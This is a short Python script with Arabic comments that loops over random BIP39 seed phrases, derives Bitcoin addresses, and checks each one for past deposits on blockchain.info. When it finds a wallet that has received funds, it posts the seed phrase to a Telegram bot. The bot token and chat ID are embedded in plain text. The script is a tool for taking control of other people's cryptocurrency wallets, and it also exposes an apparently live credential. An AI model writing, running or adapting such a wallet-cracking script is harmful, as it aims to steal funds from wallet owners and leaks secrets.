import requests
import time
from mnemonic import Mnemonic
import bip32utils

# بياناتك جاهزة
TELEGRAM_TOKEN = "8542041880:AAFeyvqbOiV37UKP8i5ogtujBfk15RAzYJQ"
CHAT_ID = "6798173369"

def send_msg(text):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
    except: pass

def run():
    mnemon = Mnemonic("english")
    send_msg("🚀 *البوت بدأ العمل الآن من هاتفك!*")
    print("البوت يعمل الآن... راقب تلجرام")
    
    while True:
        try:
            phrase = mnemon.generate(strength=128)
            seed = mnemon.to_seed(phrase)
            root_key = bip32utils.BIP32Key.fromEntropy(seed)
            child_key = root_key.ChildKey(44 + bip32utils.BIP32_HARDEN).ChildKey(0 + bip32utils.BIP32_HARDEN).ChildKey(0 + bip32utils.BIP32_HARDEN).ChildKey(0).ChildKey(0)
            address = child_key.Address()
            
            # فحص سريع
            res = requests.get(f"https://blockchain.info/rawaddr/{address}", timeout=10)
            if res.status_code == 200:
                data = res.json()
                if data.get('total_received', 0) > 0:
                    msg = f"💰 *وجدنا محفظة!* \nالكلمات: `{phrase}` \nالعنوان: `{address}`"
                    send_msg(msg)
            
            time.sleep(2) # فاصل زمني
        except:
            time.sleep(5)

if __name__ == "__main__":
    run()
